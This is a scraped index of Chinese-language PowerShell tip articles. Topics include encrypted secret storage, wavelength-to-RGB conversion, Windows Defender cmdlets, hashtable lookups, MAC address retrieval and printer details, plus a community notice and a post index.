&quot;$env:temp\\safeconnectionstring.test&quot;[ordered]@{ Con1 = 'secret1' | ConvertTo-SecureString -AsPlainText -Force Con2 = 'secret2' | ConvertTo-SecureString -AsPlainText -Force Con3 = 'secret3' | ConvertTo-SecureString -AsPlainText -Force} | Export-Clixml -Path $Path 它将三段机密信息存储到一个哈希表中，将其转换为安全字符串，然后安全地将它们导出到 XML。机密的关键是运行此脚本的用户和机器，因此只有此人（在同一台计算机上）才能稍后读取信息。 如果您不想将机密信息存储在任何地方，您还可以交互式地输入它们： 12345678$Path = &quot;$env:temp\\safeconnectionstring.test&quot;[ordered]@{ Con1 = Read-Host -Prompt Secret1 -AsSecureString Con2 = Read-Host -Prompt Secret1 -AsSecureString Con3 = Read-Host -Prompt Secret1 -AsSecureString} | Export-Clixml -Path $Path Now, when it is time to use the secrets, you need a way to convert secure strings back to plain text. This is what this script does:现在，当需要使用这些机密信息时，您需要一种将安全字符串转换回纯文本的方法。此脚本的操作： 1234567$hash = Import-Clixml -Path $Path# important: MUST cast $keys to [string[]] or else you cannot modify the hash# in the loop:[string[]]$keys = $hash.Keys$keys | ForEach-Object { $hash[$_] = [PSCredential]::new('xyz', $hash[$_]).GetNetworkCredential().Password} 结果($hash)是一个哈希表，其中包含以纯文本形式保存的机密信息，因此在此示例中，您可以通过三个键“con1”、“con2”和“con3”访问这三个机密信息： 12345678PS&gt; $hash.Con1secret1PS&gt; $hash.Con2secret2PS&gt; $hash.Con3secret3","link":"/2023/03/06/storing-any-text-encrypted/"},{"title":"PowerShell 技能连载 - 将波长转换为 RGB","text":"PowerShell 是一种通用脚本语言，因此您可以使用它来完成各种任务。以下是一个将光波长转换为相应 RGB 颜色值的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101function Convert-WavelengthToRgb{ # derived from http://www.physics.sfasu.edu/astro/color/spectra.html param ( [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)] [ValidateRange(380,780)] [int] $Wavelength, [double] $Gamma = 0.8, [int] [ValidateRange(1,255)] $Intensity = 255, [switch] $AdjustHumanSensitivity ) process { #from: https://www.codedrome.com/exploring-the-visible-spectrum-in-python/ $factor = 0 $result = [PSCustomObject]@{ Wavelength = $Wavelength R = 0 G = 0 B = 0 } switch($Wavelength) { { $_ -lt 420 } { $result.R = -($_ - 440) / 60 $result.B = 1 $factor = 0.3 + 0.7 * ($_ - 380) / 40 break } { $_ -lt 440 } { $result.R = -($_ - 440) / 60 $result.B = 1 $factor = 1 break } { $_ -lt 490 } { $result.G = ($_ - 440) / 50 $result.B = 1 $factor = 1 break } { $_ -lt 510 } { $result.B = -($_ - 510) / 20 $result.G = 1 $factor = 1 break } { $_ -lt 580 } { $result.R = ($_ - 510) / 70 $result.G = 1 $factor = 1 break } { $_ -lt 645 } { $result.G = -($_ - 645) / 65 $result.R = 1 $factor = 1 break } { $_ -le 700 } { $result.R = 1 $factor = 1 break } { $_ -le 780 } { $result.R = 1 $factor = 0.3 + 0.7 * (780 - $_) / 80 break } } if ($AdjustHumanSensitivity.IsPresent -eq $false) { $factor = 1 } $result.R = [Math]::Pow( ($result.R * $factor), $gamma) * $Intensity -as [int] $result.G = [Math]::Pow( ($result.G * $factor), $gamma) * $Intensity -as [int] $result.B = [Math]::Pow( ($result.B * $factor), $gamma) * $Intensity -as [int] return $result }} 现在，将整个可见光谱转换为相应的 RGB 值就变得简单了： 12345# Calculate RGB values for the visible light spectrum (wavelengths)380..780 | Convert-WavelengthToRgb | Out-GridView -Title 'Without Correction' 由于人眼对不同颜色的敏感度不同，该函数甚至可以考虑此敏感度并自动应用校正： 123380..780 | Convert-WavelengthToRgb -AdjustHumanSensitivity | Out-GridView -Title 'With Correction'","link":"/2023/03/08/converting-wavelength-to-rgb/"},{"title":"PowerShell 技能连载 - 自动化操作 Defender 杀毒软件（第 1 部分）","text":"在 Windows 上，PowerShell 带有用于自动化操作内置防病毒引擎 “Defender” 的 cmdlet。 如果您想自动更新签名，请尝试以下操作： 1PS C:\\&gt; Update-MpSignature 如果您在计划任务的脚本中运行此命令，则现在可以完全控制。无需管理员特权。 同样，PowerShell 可以仅使用一个命令随时启动快速扫描： 1PS C:\\&gt; Start-MpScan -ScanType QuickScan 扫描进度显示为 PowerShell 进度条，无需打开烦人的对话框。 如果您想知道您最近面临的最新威胁，请让 Defender 输出其威胁分析： 12345678910111213PS C:\\&gt; Get-MpThreatCategoryID : 27DidThreatExecute : FalseIsActive : TrueResources :RollupStatus : 1SchemaVersion : 1.0.0.0SeverityID : 1ThreatID : 311978ThreatName : PUADlManager:Win32/DownloadSponsorTypeID : 0PSComputerName :","link":"/2023/03/10/automating-defender-antivirus-part-1/"},{"title":"PowerShell 技能连载 - 自动化操作 Defender 杀毒软件（第 2 部分）","text":"在 Windows 上，PowerShell 带有用于自动化内置防病毒引擎 “Defender” 的 cmdlet。在第二部分中，让我们看看如何找出在您的计算机上活动的防病毒设置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108PS C:\\&gt; Get-MpPreferenceAllowDatagramProcessingOnWinServer : FalseAllowNetworkProtectionDownLevel : FalseAllowNetworkProtectionOnWinServer : FalseAllowSwitchToAsyncInspection : FalseAttackSurfaceReductionOnlyExclusions : {N/A: Must be and administrator to view exclusions}AttackSurfaceReductionRules_Actions :AttackSurfaceReductionRules_Ids :CheckForSignaturesBeforeRunningScan : FalseCloudBlockLevel : 1CloudExtendedTimeout : 1ComputerID : 7AB83555-0B97-47C7-A67C-8778E4757F65ControlledFolderAccessAllowedApplications : {N/A: Must be and administrator to view exclusions}ControlledFolderAccessProtectedFolders :DefinitionUpdatesChannel : 0DisableArchiveScanning : FalseDisableAutoExclusions : FalseDisableBehaviorMonitoring : FalseDisableBlockAtFirstSeen : FalseDisableCatchupFullScan : TrueDisableCatchupQuickScan : TrueDisableCpuThrottleOnIdleScans : TrueDisableDatagramProcessing : FalseDisableDnsOverTcpParsing : FalseDisableDnsParsing : FalseDisableEmailScanning : TrueDisableFtpParsing : FalseDisableGradualRelease : FalseDisableHttpParsing : FalseDisableInboundConnectionFiltering : FalseDisableIOAVProtection : FalseDisableNetworkProtectionPerfTelemetry : FalseDisablePrivacyMode : FalseDisableRdpParsing : FalseDisableRealtimeMonitoring : FalseDisableRemovableDriveScanning : TrueDisableRestorePoint : TrueDisableScanningMappedNetworkDrivesForFullScan : TrueDisableScanningNetworkFiles : FalseDisableScriptScanning : FalseDisableSmtpParsing : FalseDisableSshParsing : FalseDisableTlsParsing : FalseEnableControlledFolderAccess : 0EnableDnsSinkhole : TrueEnableFileHashComputation : FalseEnableFullScanOnBatteryPower : FalseEnableLowCpuPriority : FalseEnableNetworkProtection : 0EngineUpdatesChannel : 0ExclusionExtension : {N/A: Must be and administrator to view exclusions}ExclusionIpAddress : {N/A: Must be and administrator to view exclusions}ExclusionPath : {N/A: Must be and administrator to view exclusions}ExclusionProcess : {N/A: Must be and administrator to view exclusions}ForceUseProxyOnly : FalseHighThreatDefaultAction : 0IntelTDTEnabled : TrueLowThreatDefaultAction : 0MAPSReporting : 2MeteredConnectionUpdates : FalseModerateThreatDefaultAction : 0PlatformUpdatesChannel : 0ProxyBypass :ProxyPacUrl :ProxyServer :PUAProtection : 1QuarantinePurgeItemsAfterDelay : 90RandomizeScheduleTaskTimes : TrueRealTimeScanDirection : 0RemediationScheduleDay : 0RemediationScheduleTime : 02:00:00ReportDynamicSignatureDroppedEvent : FalseReportingAdditionalActionTimeOut : 10080ReportingCriticalFailureTimeOut : 10080ReportingNonCriticalTimeOut : 1440ScanAvgCPULoadFactor : 50ScanOnlyIfIdleEnabled : TrueScanParameters : 1ScanPurgeItemsAfterDelay : 10ScanScheduleDay : 0ScanScheduleOffset : 120ScanScheduleQuickScanTime : 00:00:00ScanScheduleTime : 02:00:00SchedulerRandomizationTime : 4ServiceHealthReportInterval : 60SevereThreatDefaultAction : 0SharedSignaturesPath :SignatureAuGracePeriod : 0SignatureBlobFileSharesSources :SignatureBlobUpdateInterval : 60SignatureDefinitionUpdateFileSharesSources :SignatureDisableUpdateOnStartupWithoutEngine : FalseSignatureFallbackOrder : MicrosoftUpdateServer|MMPCSignatureFirstAuGracePeriod : 120SignatureScheduleDay : 8SignatureScheduleTime : 01:45:00SignatureUpdateCatchupInterval : 1SignatureUpdateInterval : 0SubmitSamplesConsent : 1ThreatIDDefaultAction_Actions : {6}ThreatIDDefaultAction_Ids : {311978}ThrottleForScheduledScanOnly : TrueTrustLabelProtectionStatus : 0UILockdown : FalseUnknownThreatDefaultAction : 0PSComputerName : 从结果中可以看到，一些设置是受保护的，需要管理员权限才能查询。 如果您想更改防病毒软件设置，只需使用 Set-MpPreference 命令。 当然，您可以使用 Select-Object 命令过滤返回的信息以回答特定问题，但如果您想根据值过滤信息怎么办？比如说，您需要一份当前关闭的所有功能的列表？ 以下是一种聪明的方法，使用底层的 PSObject 列出所有属性的名称，然后根据它们的值进行过滤： 12345$preference = Get-MpPreference[PSObject]$psObject = $preference.PSObject$psObject.Properties | Where-Object { $_.Value -is [bool] -and $_.Value -eq $true } | Select-Object -ExpandProperty Name 同样，下面的代码列出了所有当前已禁用的属性（值为 $false）： 12345$preference = Get-MpPreference[PSObject]$psObject = $preference.PSObject$psObject.Properties | Where-Object { $_.Value -is [bool] -and $_.Value -eq $false } | Select-Object -ExpandProperty Name 由于上述方法可以根据任何属性值进行过滤，因此您可以轻松地调整它，例如只转储包含小于 500 的 [byte] 属性： 12345$preference = Get-MpPreference[PSObject]$psObject = $preference.PSObject$psObject.Properties | Where-Object { $_.Value -is [byte] -and $_.Value -lt 500 } | Select-Object -Property Name, Value 以下是执行结果： Name Value ---- ----- CloudBlockLevel 1 DefinitionUpdatesChannel 0 EnableControlledFolderAccess 0 EnableNetworkProtection 0 EngineUpdatesChannel 0 HighThreatDefaultAction 0 LowThreatDefaultAction 0 MAPSReporting 2 ModerateThreatDefaultAction 0 PlatformUpdatesChannel 0 PUAProtection 1 RealTimeScanDirection 0 RemediationScheduleDay 0 ScanAvgCPULoadFactor 50 ScanParameters 1 ScanScheduleDay 0 SevereThreatDefaultAction 0 SignatureScheduleDay 8 SubmitSamplesConsent 1 UnknownThreatDefaultAction 0 现在，我们总结一下：通过将代码封装在函数中，您使代码可以重复使用，自动添加可扩展性（在上面的示例中，我们现在可以在同一个调用中转换一个或数千个字符串），并且您的生产脚本代码变得更短，可以集中精力完成真正想要实现的任务。 1234567891011121314151617PS C:\\&gt; Get-Command -Module ConfigDefenderCommandType Name Version Source----------- ---- ------- ------Function Add-MpPreference 1.0 ConfigDefenderFunction Get-MpComputerStatus 1.0 ConfigDefenderFunction Get-MpPreference 1.0 ConfigDefenderFunction Get-MpThreat 1.0 ConfigDefenderFunction Get-MpThreatCatalog 1.0 ConfigDefenderFunction Get-MpThreatDetection 1.0 ConfigDefenderFunction Remove-MpPreference 1.0 ConfigDefenderFunction Remove-MpThreat 1.0 ConfigDefenderFunction Set-MpPreference 1.0 ConfigDefenderFunction Start-MpRollback 1.0 ConfigDefenderFunction Start-MpScan 1.0 ConfigDefenderFunction Start-MpWDOScan 1.0 ConfigDefenderFunction Update-MpSignature 1.0 ConfigDefender","link":"/2023/03/14/automating-defender-antivirus-part-2/"},{"title":"PowerShell 技能连载 - 翻译数据","text":"哈希表和字典是完美的查找表：每当您的原始数据包含难以理解的数字或命令返回仅为数值返回值时，哈希表可以将这些数字转换为友好的文本。 由于您可以自由地向哈希表添加任何键，因此要翻译的数字也不必是连续的数字范围。 以下是一个示例，从 WMI 查询操作系统信息，然后将您的 Windows SKU 从数字转换为描述性文本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163# get any info, i.e. some WMI information about your OS$info = Get-CimInstance -ClassName Win32_OperatingSystem# it may include information that is cryptically encoded as some number:$rawData = $info.OperatingSystemSKU# by using a hash table, you can easily translate the numbers to text:$translation = @{ 0 = 'UNDEFINED' 1 = 'ULTIMATE' 2 = 'HOME_BASIC' 3 = 'HOME_PREMIUM' 4 = 'ENTERPRISE' 5 = 'HOME_BASIC_N' 6 = 'BUSINESS' 7 = 'STANDARD_SERVER' 8 = 'DATACENTER_SERVER' 9 = 'SMALLBUSINESS_SERVER' 10 = 'ENTERPRISE_SERVER' 11 = 'STARTER' 12 = 'DATACENTER_SERVER_CORE' 13 = 'STANDARD_SERVER_CORE' 14 = 'ENTERPRISE_SERVER_CORE' 15 = 'ENTERPRISE_SERVER_IA64' 16 = 'BUSINESS_N' 17 = 'WEB_SERVER' 18 = 'CLUSTER_SERVER' 19 = 'HOME_SERVER' 20 = 'STORAGE_EXPRESS_SERVER' 21 = 'STORAGE_STANDARD_SERVER' 22 = 'STORAGE_WORKGROUP_SERVER' 23 = 'STORAGE_ENTERPRISE_SERVER' 24 = 'SERVER_FOR_SMALLBUSINESS' 25 = 'SMALLBUSINESS_SERVER_PREMIUM' 26 = 'HOME_PREMIUM_N' 27 = 'ENTERPRISE_N' 28 = 'ULTIMATE_N' 29 = 'WEB_SERVER_CORE' 30 = 'MEDIUMBUSINESS_SERVER_MANAGEMENT' 31 = 'MEDIUMBUSINESS_SERVER_SECURITY' 32 = 'MEDIUMBUSINESS_SERVER_MESSAGING' 33 = 'SERVER_FOUNDATION' 34 = 'HOME_PREMIUM_SERVER' 35 = 'SERVER_FOR_SMALLBUSINESS_V' 36 = 'STANDARD_SERVER_V' 37 = 'DATACENTER_SERVER_V' 38 = 'ENTERPRISE_SERVER_V' 39 = 'DATACENTER_SERVER_CORE_V' 40 = 'STANDARD_SERVER_CORE_V' 41 = 'ENTERPRISE_SERVER_CORE_V' 42 = 'HYPERV' 43 = 'STORAGE_EXPRESS_SERVER_CORE' 44 = 'STORAGE_STANDARD_SERVER_CORE' 45 = 'STORAGE_WORKGROUP_SERVER_CORE' 46 = 'STORAGE_ENTERPRISE_SERVER_CORE' 47 = 'STARTER_N' 48 = 'PROFESSIONAL' 49 = 'PROFESSIONAL_N' 50 = 'SB_SOLUTION_SERVER' 51 = 'SERVER_FOR_SB_SOLUTIONS' 52 = 'STANDARD_SERVER_SOLUTIONS' 53 = 'STANDARD_SERVER_SOLUTIONS_CORE' 54 = 'SB_SOLUTION_SERVER_EM' 55 = 'SERVER_FOR_SB_SOLUTIONS_EM' 56 = 'SOLUTION_EMBEDDEDSERVER' 57 = 'SOLUTION_EMBEDDEDSERVER_CORE' 58 = 'PROFESSIONAL_EMBEDDED' 59 = 'ESSENTIALBUSINESS_SERVER_MGMT' 60 = 'ESSENTIALBUSINESS_SERVER_ADDL' 61 = 'ESSENTIALBUSINESS_SERVER_MGMTSVC' 62 = 'ESSENTIALBUSINESS_SERVER_ADDLSVC' 63 = 'SMALLBUSINESS_SERVER_PREMIUM_CORE' 64 = 'CLUSTER_SERVER_V' 65 = 'EMBEDDED' 66 = 'STARTER_E' 67 = 'HOME_BASIC_E' 68 = 'HOME_PREMIUM_E' 69 = 'PROFESSIONAL_E' 70 = 'ENTERPRISE_E' 71 = 'ULTIMATE_E' 72 = 'ENTERPRISE_EVALUATION' 76 = 'MULTIPOINT_STANDARD_SERVER' 77 = 'MULTIPOINT_PREMIUM_SERVER' 79 = 'STANDARD_EVALUATION_SERVER' 80 = 'DATACENTER_EVALUATION_SERVER' 84 = 'ENTERPRISE_N_EVALUATION' 85 = 'EMBEDDED_AUTOMOTIVE' 86 = 'EMBEDDED_INDUSTRY_A' 87 = 'THINPC' 88 = 'EMBEDDED_A' 89 = 'EMBEDDED_INDUSTRY' 90 = 'EMBEDDED_E' 91 = 'EMBEDDED_INDUSTRY_E' 92 = 'EMBEDDED_INDUSTRY_A_E' 95 = 'STORAGE_WORKGROUP_EVALUATION_SERVE' 96 = 'STORAGE_STANDARD_EVALUATION_SERVER' 97 = 'CORE_ARM' 98 = 'CORE_N' 99 = 'CORE_COUNTRYSPECIFIC' 100 = 'CORE_SINGLELANGUAGE' 101 = 'CORE' 103 = 'PROFESSIONAL_WMC' 105 = 'EMBEDDED_INDUSTRY_EVAL' 106 = 'EMBEDDED_INDUSTRY_E_EVAL' 107 = 'EMBEDDED_EVAL' 108 = 'EMBEDDED_E_EVAL' 109 = 'NANO_SERVER' 110 = 'CLOUD_STORAGE_SERVER' 111 = 'CORE_CONNECTED' 112 = 'PROFESSIONAL_STUDENT' 113 = 'CORE_CONNECTED_N' 114 = 'PROFESSIONAL_STUDENT_N' 115 = 'CORE_CONNECTED_SINGLELANGUAGE' 116 = 'CORE_CONNECTED_COUNTRYSPECIFIC' 117 = 'CONNECTED_CAR' 118 = 'INDUSTRY_HANDHELD' 119 = 'PPI_PRO' 120 = 'ARM64_SERVER' 121 = 'EDUCATION' 122 = 'EDUCATION_N' 123 = 'IOTUAP' 124 = 'CLOUD_HOST_INFRASTRUCTURE_SERVER' 125 = 'ENTERPRISE_S' 126 = 'ENTERPRISE_S_N' 127 = 'PROFESSIONAL_S' 128 = 'PROFESSIONAL_S_N' 129 = 'ENTERPRISE_S_EVALUATION' 130 = 'ENTERPRISE_S_N_EVALUATION' 135 = 'HOLOGRAPHIC' 138 = 'PRO_SINGLE_LANGUAGE' 139 = 'PRO_CHINA' 140 = 'ENTERPRISE_SUBSCRIPTION' 141 = 'ENTERPRISE_SUBSCRIPTION_N' 143 = 'DATACENTER_NANO_SERVER' 144 = 'STANDARD_NANO_SERVER' 145 = 'DATACENTER_A_SERVER_CORE' 146 = 'STANDARD_A_SERVER_CORE' 147 = 'DATACENTER_WS_SERVER_CORE' 148 = 'STANDARD_WS_SERVER_CORE' 149 = 'UTILITY_VM' 159 = 'DATACENTER_EVALUATION_SERVER_CORE' 160 = 'STANDARD_EVALUATION_SERVER_CORE' 161 = 'PRO_WORKSTATION' 162 = 'PRO_WORKSTATION_N' 164 = 'PRO_FOR_EDUCATION' 165 = 'PRO_FOR_EDUCATION_N' 168 = 'AZURE_SERVER_CORE' 169 = 'AZURE_NANO_SERVER' 171 = 'ENTERPRISEG' 172 = 'ENTERPRISEGN' 175 = 'SERVERRDSH' 178 = 'CLOUD' 179 = 'CLOUDN' 180 = 'HUBOS' 182 = 'ONECOREUPDATEOS' 183 = 'CLOUDE' 184 = 'ANDROMEDA' 185 = 'IOTOS' 186 = 'CLOUDEN'}# use the raw data as key to the hash table# AND MAKE SURE you convert numeric data to [int]!# (WMI returns unusual data types like [byte] and [UInt16],# and hash table keys are type-aware)$translation[$rawData -as [int]] 这个基本的概念适用于所有类型的翻译。以下是一个示例，可以将 ping.exe 提供的返回值进行翻译： 123456789101112131415161718$translation = @{ 0 = 'SUCCESS' 1 = 'FAILURE' 2 = 'ERROR'}1..255 | ForEach-Object { # create the IP address to ping # make sure you adjust this to your segment! $ip = &quot;192.168.2.$_&quot; # execute ping.exe and disregard the text output ping -n 1 -w 500 $ip &gt; $null # instead return the translated return value found in $LASTEXITCODE [PSCustomObject]@{ IpAddress = $ip Status = $translation[$LASTEXITCODE] }} 以下是执行结果： IpAddress Status --------- ------ 192.168.2.1 SUCCESS 192.168.2.2 FAILURE 192.168.2.3 FAILURE 192.168.2.4 FAILURE 192.168.2.5 FAILURE 192.168.2.6 FAILURE ...","link":"/2023/03/16/translating-data/"},{"title":"PowerShell 技术互动社区发展状况（2023 年 3 月）","text":"至 2023 年 3 月，“PowerShell 技术互动”社区人数已达到 1976 人，十分接近社区最大容量（2000 人），保持 PowerShell 最大中文社区的位置。根据腾讯社交平台的策略，社区人数的上限为 2000 人，我们会尽可能保留机会给活跃用户。 如您遇到 PowerShell 方面的技术问题，或有好的资源希望分享，请加入我们。QQ 群号：271143343。 或者用手机 QQ 扫描二维码：","link":"/2023/03/20/powershell-technology-interactive-community-growth-status/"},{"title":"PowerShell 博客文章汇总 (2022-04 ~ 2023-03)","text":"2022 年 03 月 2022-03-21 Defender: 清空威胁列表和相关设置 2022-03-23 从 Internet 下载文件 2022-03-25 在 PowerShell 使用高效的列表 2022-03-29 Update PowerShell’s PSReadLine 2022-03-31 Using Dynamic Help in PowerShell Console 2022 年 04 月 2022-04-04 Using Predictive IntelliSense 2022-04-06 Automating User Confirmation 2022-04-08 Managing Wi-Fi Profiles 2022-04-12 More Control with Strict Mode 2022-04-14 利用 WMI（第 1 部分） 2022-04-18 利用 WMI（第 2 部分） 2022-04-20 利用 WMI（第 3 部分） 2022-04-22 利用 WMI（第 4 部分） 2022-04-26 利用 WMI（第 5 部分） 2022-04-28 2022 年的 PowerShell 计划 2022 年 05 月 2022-05-02 管理蓝牙设备（第 1 部分） 2022-05-04 管理蓝牙设备（第 2 部分） 2022-05-06 管理蓝牙设备（第 2 部分） 2022-05-10 清理硬盘（第 1 部分） 2022-05-12 清理硬盘（第 2 部分） 2022-05-16 专业地处理错误 2022-05-18 签名 PowerShell 脚本（第 1 部分） 2022-05-20 签名 PowerShell 脚本（第 2 部分） 2022-05-24 签名 PowerShell 脚本（第 3 部分） 2022-05-26 为 PowerShell 创建 sudo（第 1 部分） 2022-05-30 为 PowerShell 创建 sudo（第 2 部分） 2022 年 06 月 2022-06-01 读取 Windows 10 产品序列号 2022-06-03 简单的类似 grep 的文本过滤器（第 1 部分） 2022-06-07 解析 URL 2022-06-09 值得一读：PowerShell 语言规范 2022-06-13 检测多语言在线文档（第 1 部分） 2022-06-15 检测多语言在线文档（第 2 部分） 2022-06-17 请注意数组 2022-06-21 PowerShell 扩展的重要更新 2022-06-23 解锁多个文件 2022-06-27 快速查找过期的 PowerShell 模块 2022-06-29 清理 PowerShell 模块（第 1 部分） 2022 年 07 月 2022-07-01 清理 PowerShell 模块（第 2 部分） 2022-07-05 清理 PowerShell 模块（第 3 部分） 2022-07-07 下载文件 2022-07-11 恢复被浪费的硬盘空间 2022-07-13 在 PowerShell 中粘贴多行 2022-07-15 在选中的代码中运行 $PSScriptRoot 2022-07-19 创建世界地图图像 2022-07-21 确定语言包（第 1 部分） 2022-07-25 确定语言包（第 2 部分） 2022-07-27 确定语言包（第 3 部分） 2022-07-29 将语言 ID 转为语言名称 2022 年 08 月 2022-08-02 记录变量类型 2022 年 09 月 2022-09-27 请担心 -match 运算符 2022-09-29 利用用户配置文件的优势 2022 年 10 月 2022-10-03 更新帮助 2022-10-05 使用 HTML 来创建 PDF 报告（第 1 部分） 2022-10-07 使用 HTML 来创建 PDF 报告（第 2 部分） 2022-10-11 使用 HTML 来创建 PDF 报告（第 3 部分） 2022-10-13 存取 Windows 凭据管理器 2022-10-17 查找 MSI 产品代码（第 1 部分） 2022-10-19 查找 MSI 产品代码（第 2 部分） 2022-10-21 遮罩输入框（第 1 部分） 2022-10-25 遮罩输入框（第 2 部分） 2022-10-27 获取卷 ID（第 1 部分） 2022-10-31 获取卷 ID（第 2 部分） 2022 年 11 月 2022-11-02 创建新的代码签名测试证书 2022-11-04 无人值守读取 PFX 证书 2022-11-08 获取系统正常运行时间 2022-11-10 当格式化失败时 2022-11-29 小心使用数组 2022-11-29 Determining Language Packs (Part 3) 2022-11-29 检测多语言在线文档（第 2 部分） 2023 年2023 年 01 月 2023-01-03 Showing Progress in Taskbar Buttons 2023-01-05 在任务栏按钮中显示不确定的进度 2023-01-09 在任务栏按钮显示错误状态 2023-01-11 在任务栏按钮显示警告状态 2023-01-13 管理文件共享 2023-01-17 Custom Action for Unknown Commands 2023-01-19 订阅锁定和解锁事件 2023-01-23 通过 SNMP 查询高级的打印机 2023-01-25 研究 PowerShell 命令结果 2023-01-27 导出 Edge 的 Cookie 2023-01-31 将 PowerShell 脚本作为命令（第 1 部分） 2023-01-31 将 PowerShell 脚本作为命令（第 2 部分） 2023 年 02 月 2023-02-06 使用枚举来解析序号 2023-02-08 检测电池健康与质量 2023-02-09 选择最佳方法：单词转大写（第 1 部分） 2023-02-10 选择最佳方法：单词转大写（第 1 部分） 2023-02-12 选择最佳方法：单词转大写（第 3 部分） 2023-02-14 选择最佳方法：单词转大写（第 2 部分） 2023-02-16 Picking Best Approach: Example Capitalizing Words (Part 3) 2023-02-20 Picking Best Approach Example Capitalizing Words (Part 4) 2023-02-22 研究 ConfirmImpact（第 1 部分：用户视角） 2023-02-24 研究 ConfirmImpact（第 2 部分：脚本作者视角） 2023-02-28 使用合适的数据类型（第 1 部分） 2023 年 03 月 2023-03-02 使用合适的数据类型（第 2 部分） 2023-03-06 自动化操作 Defender 杀入软件（第 1 部分） 2023-03-06 存储任何加密的文本 2023-03-08 将波长转换为 RGB 2023-03-10 自动化操作 Defender 杀入软件（第 1 部分） 2023-03-14 自动化操作 Defender 杀入软件（第 2 部分） 2023-03-16 翻译数据","link":"/2023/03/19/blog-index/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 解决问题（第 4 部分）","text":"PowerShell 为您提供了丰富的方法来解决任务。它们总是归结为相同的策略。在这个小系列中，我们将逐一说明它们。 以下是要解决的问题：获取计算机的 MAC 地址。 在我们之前的提示中，我们看过命令和运算符。但如果你仍然无法获得所需信息怎么办？ 即使如此，PowerShell 也有选项可供选择，因为您可以直接访问 .NET Framework 类型和方法。或者换句话说：如果没有程序员替您完成工作并提供特定命令，则可以自己编写功能。 显然，这可能很快成为最困难的方法，因为现在您需要具备程序员技能，并且需要更多地搜索谷歌。你需要找到一个内置的 .NET 类型来处理你所需的信息。 经过一番研究后，您可能会发现 [System.Net.NetworkInformation.NetworkInterface] .NET类型管理网络适配器，并且在 PowerShell 中，所有 .NET 类型后添加两个冒号，即可访问其方法： 12345678910111213141516171819202122PS C:\\&gt; [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces()Id : {DC7C0CE2-B070-4070-B5CB-1C400DA69AF8}Name : vEthernet (Default Switch)Description : Hyper-V Virtual Ethernet AdapterNetworkInterfaceType : EthernetOperationalStatus : UpSpeed : 10000000000IsReceiveOnly : FalseSupportsMulticast : TrueId : {44FE83FC-7565-4B18-AAC8-AB3EC075E822}Name : Ethernet 2Description : USB EthernetNetworkInterfaceType : EthernetOperationalStatus : UpSpeed : 1000000000IsReceiveOnly : FalseSupportsMulticast : True... 由于 .NET 返回结构化数据，因此 PowerShell cmdlet 返回的结果与原始 .NET 方法返回的结果之间没有区别。您可以以相同的方式消耗和处理数据： 1234567891011PS C:\\&gt; [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | Select-Object -Property Name, NetworkInterfaceType, DescriptionName NetworkInterfaceType Description---- -------------------- -----------vEthernet (Default Switch) Ethernet Hyper-V Virtual Ethernet AdapterEthernet 2 Ethernet USB EthernetLocal Area Connection* 1 Wireless80211 Microsoft Wi-Fi Direct Virtual AdapterLocal Area Connection* 2 Wireless80211 Microsoft Wi-Fi Direct Virtual Adapter #2WLAN Wireless80211 Killer(R) Wi-Fi 6 AX1650s 160MHz Wireless Network Adapter (201D2W)Bluetooth Network Connection Ethernet Bluetooth Device (Personal Area Network)Loopback Pseudo-Interface 1 Loopback Software Loopback Interface 1 但是，您找到的.NET方法可能不直接包含所需信息。在我们的示例中，GetAllNetworkInterfaces() 返回所有网络适配器，但要获取它们的 MAC 地址，则需要深入了解 .NET 对象树。这就使得使用这种技术变得更加困难（但也令人兴奋和有益）。 这是获取有关您的网络适配器的所有所需信息的完整 .NET 代码，甚至包括特定适配器当前是否处于活动状态的信息： 12345678910111213[System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ForEach-Object { $nic = $_ [PSCustomObject]@{ Name = $_.Name Status = $_.OperationalStatus Mac = [System.BitConverter]::ToString($nic.GetPhysicalAddress().GetAddressBytes()) Type = $_.NetworkInterfaceType SpeedGb = $(if ($_.Speed -ge 0) { $_.Speed/1000000000 } ) Description = $_.Description } } 这就是整个工作闭环之处：通过将此原始 .NET 代码封装到 PowerShell 函数中，您可以向 PowerShell 词汇表添加一个新的简单命令： 12345678910111213141516function Get-MacAddress{ [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() | ForEach-Object { $nic = $_ [PSCustomObject]@{ Name = $_.Name Status = $_.OperationalStatus Mac = [System.BitConverter]::ToString($nic.GetPhysicalAddress().GetAddressBytes()) Type = $_.NetworkInterfaceType SpeedGb = $(if ($_.Speed -ge 0) { $_.Speed/1000000000 } ) Description = $_.Description } }} 一旦你运行了这个函数定义代码，就可以再次使用一个高度专业且易于使用的 PowerShell 命令，并附加你常用的一组 PowerShell cmdlet（Select-Object、Where-Object），将数据处理成所需的形式： 12345678910PS C:\\&gt; Get-MacAddress | Where-Object Mac | Select-Object -Property Name, Status, Mac, SpeedGbName Status Mac SpeedGb---- ------ --- -------vEthernet (Default Switch) Up 00-15-5D-58-46-A8 10Ethernet 2 Up 80-3F-5D-05-58-91 1Local Area Connection* 1 Down 24-EE-9A-54-1B-E6Local Area Connection* 2 Down 26-EE-9A-54-1B-E5WLAN Down 24-EE-9A-54-1B-E5 0,78Bluetooth Network Connection Down 24-EE-9A-54-1B-E9 0,003","link":"/2023/04/11/solving-problems-with-powershell-part-4/"},{"title":"PowerShell 技能连载 - 更丰富的打印机信息","text":"Get-Printer 返回所有本地打印机的基本信息。当您添加开关参数 -Full 时，它会返回更详细的信息，例如打印机权限，但乍一看，无论是否指定了 -Full，Get-Printer 似乎输出相同的信息。 要查看增强信息，必须要求 PowerShell 显示所有属性，因为默认情况下所有增强属性都是隐藏的。以下代码揭示了通过指定 -Full 所做出的差异： 12Get-Printer | Select-Object -Property * | Out-GridView -Title 'Without -Full'Get-Printer -Full | Select-Object -Property * | Out-GridView -Title 'With -Full' 